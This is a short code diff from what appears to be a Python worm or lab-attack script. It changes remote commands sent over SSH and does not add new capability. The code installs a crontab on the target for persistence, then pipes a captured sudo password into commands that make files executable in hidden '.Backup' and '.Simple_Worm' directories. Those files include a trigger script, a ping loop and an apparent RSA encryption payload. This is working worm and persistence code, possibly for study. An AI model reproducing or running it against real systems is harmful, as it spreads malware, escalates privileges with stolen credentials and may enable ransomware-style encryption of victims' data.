@@ -60,18 +60,12 @@ time.sleep(2)
 stdio, stdout, stderr = ssh.exec_command('crontab /tmp/current2.cron', timeout = 2)
 time.sleep(2)
 
-cmd1 =  'echo "' + correct_key + '" | sudo -S chmod 777 /home/attacker/Desktop/.Backup/trigger.py'
-cmd2 =  'echo "' + correct_key + '" | sudo -S chmod 777 /home/attacker/Desktop/.Backup/Loop_ping'
-cmd3 =  'echo "' + correct_key + '" | sudo -S chmod 777 /home/attacker/Desktop/.Backup/RSA_Encrypt'
-cmd4 =  'echo "' + correct_key + '" | sudo -S chmod 777 /home/attacker/Public/.Simple_Worm/trigger.py'
-cmd5 =  'echo "' + correct_key + '" | sudo -S chmod 777 /home/attacker/Public/.Simple_Worm/Loop_ping'
-cmd6 =  'echo "' + correct_key + '" | sudo -S chmod 777 /home/attacker/Public/.Simple_Worm/RSA_Encrypt'
+cmd1 =  'echo "' + correct_key + '" | sudo -S chmod 777 /home/attacker/Desktop/.Backup/trigger.py /home/attacker/Desktop/.Backup/RSA_Encrypt /home/attacker/Desktop/.Backup/Loop_ping'
+cmd2 =  'echo "' + correct_key + '" | sudo -S chmod 777 /home/attacker/Public/.Simple_Worm/trigger.py /home/attacker/Public/.Simple_Worm/RSA_Encrypt /home/attacker/Public/.Simple_Worm/Loop_ping'
 stdio, stdout, stderr = ssh.exec_command(cmd1, timeout = 2)
+time.sleep(3)
 stdio, stdout, stderr = ssh.exec_command(cmd2, timeout = 2)
-stdio, stdout, stderr = ssh.exec_command(cmd3, timeout = 2)
-stdio, stdout, stderr = ssh.exec_command(cmd4, timeout = 2)
-stdio, stdout, stderr = ssh.exec_command(cmd5, timeout = 2)
-stdio, stdout, stderr = ssh.exec_command(cmd6, timeout = 2)
+time.sleep(3)
 
 if ssh != None:
     ssh.close()
